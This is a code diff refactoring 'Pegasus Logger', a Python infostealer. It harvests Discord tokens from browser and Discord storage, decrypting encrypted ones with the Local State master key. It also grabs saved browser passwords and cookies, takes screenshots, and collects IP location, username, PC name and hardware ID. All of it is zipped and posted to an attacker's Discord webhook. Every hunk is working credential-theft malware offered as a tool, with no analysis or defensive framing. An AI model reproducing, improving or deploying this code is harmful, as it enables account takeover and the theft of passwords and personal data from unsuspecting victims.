@@ -35,41 +35,51 @@ WEBHOOK_URL = "&WEBHOOK_URL&"
 def main(webhook_url: str):
     webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
     embed = Embed(title="Pegasus Logger", color=15535980)
+    screenshot_output = "screenshot.png"
 
-    get_location()
-    get_more()
-    GrabTokens()
+    # Data collection
+    start_scanning(embed, screenshot_output)
+    file = File(zipup())
 
-    running_threads = []
-    for thread in [
-        Thread(target=screenshot, args=("screenshot.png",)),
-        Thread(target=password),
-        Thread(target=cookiemonster),
-    ]:
-        thread.start()
-        running_threads.append(thread)
+    finalize_and_send(webhook, embed)
 
-    for thread in running_threads:
-        thread.join()
-
+def finalize_and_send(webhook:Webhook, embed:Embed, file:File):
     embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
-    embed.set_footer(text="Pegasus Logger | Made by www.addidix.xyz")
+    embed.set_footer(text="Pegasus Logger | Made by addi00000 | www.addidix.xyz")
     embed.set_thumbnail(
         url="https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https/i.imgur.com/q1NJvOx.png"
     )
 
-    file = File(zipup())
-
     webhook.send(
-        content="||@here|| <http://www.addidix.xyz>",
+        content="||@here||",
         embed=embed,
         file=file,
         avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg",
         username="Pegasus",
     )
 
-def account_info(tokens, embed):
-    for token in int(tokens):  # What is "tokens"?
+def start_scanning(embed:Embed, screenshot_output:str):
+    running_threads:list[Thread] = []
+
+    for thread in [
+        Thread(target=screenshot, args=(screenshot_output,)),
+        Thread(target=Password),
+        Thread(target=CookieMonster),
+        Thread(target=get_location, args=(embed,)),
+        Thread(target=get_misc, args=(embed,)),
+    ]:
+        thread.daemon = True
+        thread.start()
+        running_threads.append(thread)
+
+    for thread in running_threads:
+        thread.join()
+        running_threads.remove(thread)
+
+    GrabTokens()
+
+def account_info(tokens:list[str], embed:Embed):
+    for token in tokens:
         resp = get(
             "https://discord.com/api/v9/users/@me",
             headers={"Authorization": tokens[token]},
@@ -85,8 +95,7 @@ def account_info(tokens, embed):
         )
 
 
-def get_location(embed, ip_url: str = None):
-    ip = org = loc = city = country = region = googlemap = "None"
+def get_location(embed:Embed, ip_url: str = None):
     with suppress(Exception):
         data = get(ip_url or "http://ipinfo.io/json").json
 
@@ -104,21 +113,19 @@ def get_location(embed, ip_url: str = None):
         )
 
 
-def get_more(embed):
-    def gethwid():
+def get_misc(embed:Embed):
+    def get_hwid():
         p = Popen(
             "wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE
         )
         return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
-    cwd = os.getcwd()
     pc_username = getuser()
     pc_name = os.getenv("COMPUTERNAME")
-    computer_os = platform()
 
     embed.add_field(
         name="💨  OTHER",
-        value=f"OS: {computer_os}\n\nUser: {pc_username}\n\nPC Name: {pc_name}\n\nHWID: {gethwid()}\nCWD: {cwd}",
+        value=f"User: {pc_username}\n\nPC Name: {pc_name}\n\nHWID: {get_hwid()}",
     )
 
 
@@ -191,7 +198,7 @@ class GrabTokens:
         with open(config, "w") as f:
             json.dump(item, f, indent=2, sort_keys=True)
 
-    def decrypt_password(self, buff, master_key):
+    def decrypt_token(self, buff, master_key):
         with suppress(Exception):
             iv = buff[3:15]
             payload = buff[15:]
@@ -276,50 +283,28 @@ class GrabTokens:
         }
 
         # TODO: Minimize indentation
-        # TODO: Integrate PathLib?
         for _, path in paths.items():
             if not os.path.exists(path):
                 continue
             if "discord" not in path:
-                for file_name in os.listdir(path):
-                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-                        continue
-                    for line in [
-                        x.strip()
-                        for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
-                        if x.strip()
-                    ]:
-                        for regex in self.regex:
-                            for token in findall(regex, line):
-                                with suppress(Exception):
-                                    resp = get(
-                                        self.baseurl, headers=self.get_headers(token)
-                                    )
-
-                                if resp.ok and token not in self.tokens:
-                                    self.tokens.append(token)
+                self.walk_browser_datadir(path)
             elif os.path.exists(self.roaming + "\\discord\\Local State"):
                 for file_name in os.listdir(path):
                     if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                         continue
-                    for line in [
-                        x.strip()
-                        for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
-                        if x.strip()
-                    ]:
-                        for y in findall(self.encrypted_regex, line):
-                            token = None
-                            token = self.decrypt_password(
-                                base64.b64decode(
-                                    y[: y.find('"')].split("dQw4w9WgXcQ:")[1]
+                    for line in self.load_lines(path, file_name):
+                        for match in findall(self.encrypted_regex, line):
+                            token = self.decrypt_token(
+                                b64decode(
+                                    match[: match.find('"')].split("dQw4w9WgXcQ:")[1]
                                 ),
                                 self.get_master_key(
                                     self.roaming + "\\discord\\Local State"
                                 ),
                             )
 
-                            r = get(self.baseurl, headers=self.getheaders(token))
-                            if r.ok == 200 and token not in self.tokens:
+                            resp = get(self.baseurl, headers=self.get_headers(token))
+                            if resp.ok == 200 and token not in self.tokens:
                                 self.tokens.append(token)
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -327,11 +312,7 @@ class GrabTokens:
                 for _file in files:
                     if not _file.endswith(".sqlite"):
                         continue
-                    for line in [
-                        x.strip()
-                        for x in open(f"{path}\\{_file}", errors="ignore").readlines()
-                        if x.strip()
-                    ]:
+                    for line in self.load_lines(path, _file):
                         for regex in self.regex:
                             for token in findall(regex, line):
                                 with suppress(Exception):
@@ -357,8 +338,32 @@ class GrabTokens:
                 inline=False,
             )
 
+    def walk_browser_datadir(self, path):
+        for file_name in os.listdir(path):
+            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                continue
+            for line in (
+                lines.strip()
+                for lines in Path(path, file_name).read_text().splitlines()
+                if lines.strip()
+            ):
+                self.tokenize(line)
 
-class password:
+    def tokenize(self, line:str):
+        for regex in self.regex:
+            for token in findall(regex, line):
+                with suppress(Exception):
+                    resp = get(
+                        self.baseurl, headers=self.get_headers(token)
+                    )
+
+                if resp.ok and token not in self.tokens:
+                    self.tokens.append(token)
+
+    def load_lines(self, base:str, filename:str):
+        yield from (line.strip() for line in Path(base, filename).read_text().splitlines() if line.strip())
+
+class Password:
     def __init__(self):
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -428,7 +433,7 @@ class password:
             os.remove("Loginvault.db")
 
 
-class cookiemonster:
+class CookieMonster:
     def __init__(self):
         self.appdata = os.getenv("localappdata")
         self.grab_cookies()
